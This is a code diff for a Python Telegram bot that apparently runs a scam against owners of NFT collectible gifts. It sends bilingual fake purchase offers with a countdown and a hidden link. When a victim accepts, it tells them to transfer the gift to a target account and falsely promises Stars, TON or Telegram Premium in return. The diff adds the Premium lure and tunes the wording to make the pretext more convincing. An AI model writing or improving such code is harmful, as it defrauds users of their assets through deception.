@@ -56,7 +56,7 @@ async def send_offer(message: Message):
 
     parts = message.text.split()
     
-    if len(parts) < 5:
+    if len(parts) < 4:
         return
 
     is_double = parts[2].startswith("http") or parts[2].startswith("t.me")
@@ -64,16 +64,23 @@ async def send_offer(message: Message):
     if is_double:
         link1 = parts[1]
         link2 = parts[2]
-        amount = parts[3]
-        currency_raw = parts[4].lower()
-        lang = parts[5].lower() if len(parts) > 5 else "ru"
+        amount_or_currency = parts[3].lower()
+        lang = parts[4].lower() if len(parts) > 4 else "ru"
         nft_count = 2
+        amount = None
+        currency_raw = amount_or_currency
     else:
         link1 = parts[1]
         link2 = None
-        amount = parts[2]
-        currency_raw = parts[3].lower()
-        lang = parts[4].lower() if len(parts) > 4 else "ru"
+        amount_or_currency = parts[2].lower()
+        if amount_or_currency in ["premium", "prem"]:
+            amount = None
+            currency_raw = "premium"
+            lang = parts[3].lower() if len(parts) > 3 else "ru"
+        else:
+            amount = parts[2]
+            currency_raw = parts[3].lower()
+            lang = parts[4].lower() if len(parts) > 4 else "ru"
         nft_count = 1
 
     if not link1.startswith("http"):
@@ -81,7 +88,7 @@ async def send_offer(message: Message):
     if link2 and not link2.startswith("http"):
         link2 = "https://" + link2
 
-    if currency_raw not in ["stars", "ton", "gram"]:
+    if currency_raw not in ["stars", "ton", "gram", "premium", "prem"]:
         return
 
     if lang not in ["ru", "en"]:
@@ -89,10 +96,16 @@ async def send_offer(message: Message):
 
     if currency_raw == "stars":
         currency_display = STAR_EMOJI
+        amount_text = f"{amount} {currency_display}"
     elif currency_raw == "ton":
         currency_display = TON_EMOJI
+        amount_text = f"{amount} {currency_display}"
+    elif currency_raw in ["premium", "prem"]:
+        currency_display = "Telegram Premium"
+        amount_text = "Telegram Premium на 3 месяца" if lang == "ru" else "Telegram Premium for 3 months"
     else:
         currency_display = "Gram"
+        amount_text = f"{amount} {currency_display}"
 
     nft1_slug = link1.rstrip("/").split("/")[-1]
     nft1_prefix, separator, nft1_number = nft1_slug.rpartition("-")
@@ -111,14 +124,13 @@ async def send_offer(message: Message):
 
     if nft_count == 1:
         if lang == "ru":
-            offer_text = f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>\n{hidden_link}"
+            offer_text = f"<b>{sender_name} предлагает Вам {amount_text} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>\n{hidden_link}"
         else:
-            offer_text = f"<b>{sender_name} offers you {amount} {currency_display} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>\n{hidden_link}"
+            offer_text = f"<b>{sender_name} offers you {amount_text} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>\n{hidden_link}"
     else:
-        # УБРАЛИ ФРАЗУ "Система подтвердила сделку" И ИЗМЕНИЛИ ТЕКСТ
         if lang == "ru":
             offer_text = (
-                f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекцию из двух коллекционных предметов:</b>\n"
+                f"<b>{sender_name} предлагает Вам {amount_text} за коллекцию из двух коллекционных предметов:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
                 f"<i>Действует 5ч 59м.</i>\n"
@@ -126,7 +138,7 @@ async def send_offer(message: Message):
             )
         else:
             offer_text = (
-                f"<b>{sender_name} offers you {amount} {currency_display} for a collection of two collectibles:</b>\n"
+                f"<b>{sender_name} offers you {amount_text} for a collection of two collectibles:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
                 f"<i>Expires in 5h 59m.</i>\n"
@@ -140,13 +152,13 @@ async def send_offer(message: Message):
 
     last_offer_data = {
         "nft_name": nft1_name if nft_count == 1 else "Два предмета",
-        "amount": amount,
-        "currency_display": currency_display,
+        "amount_text": amount_text,
         "link": link1,
         "link2": link2,
         "sender_username": message.from_user.username,
         "lang": lang,
-        "business_connection_id": message.business_connection_id
+        "business_connection_id": message.business_connection_id,
+        "is_premium": currency_raw in ["premium", "prem"]
     }
 
     if last_message_id:
@@ -170,8 +182,7 @@ async def send_offer(message: Message):
 async def on_accept_offer(callback: CallbackQuery):
     global last_message_id
     nft_name = last_offer_data.get("nft_name", "NFT")
-    amount = last_offer_data.get("amount", "0")
-    currency_display = last_offer_data.get("currency_display", "Stars")
+    amount_text = last_offer_data.get("amount_text", "")
     link = last_offer_data.get("link", "")
     link2 = last_offer_data.get("link2")
     conn_id = last_offer_data.get("business_connection_id")
@@ -184,18 +195,16 @@ async def on_accept_offer(callback: CallbackQuery):
     if link2:
         if lang == "ru":
             new_text = (
-                f"<b>Система подтвердила сделку.</b>\n\n"
                 f"<b>• Передайте оба предмета покупателю {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарков вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
+                f"<b>После передачи подарков, {amount_text} будет автоматически активирован на вашем аккаунте.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Передать"
             btn_how = "Как передать?"
         else:
             new_text = (
-                f"<b>System confirmed the deal.</b>\n\n"
                 f"<b>• Transfer both items to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gifts, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
+                f"<b>After transferring the gifts, {amount_text} will be automatically activated on your account.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Transfer"
@@ -206,7 +215,7 @@ async def on_accept_offer(callback: CallbackQuery):
             new_text = (
                 f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
                 f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарка вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
+                f"<b>После передачи подарка, {amount_text} будет автоматически активирован на вашем аккаунте.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Передать"
@@ -215,7 +224,7 @@ async def on_accept_offer(callback: CallbackQuery):
             new_text = (
                 f"<b>Gift {nft_link} successfully sold.</b>\n\n"
                 f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gift, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
+                f"<b>After transferring the gift, {amount_text} will be automatically activated on your account.</b>\n"
                 f"{hidden_link}"
             )
             btn_transfer = "Transfer"
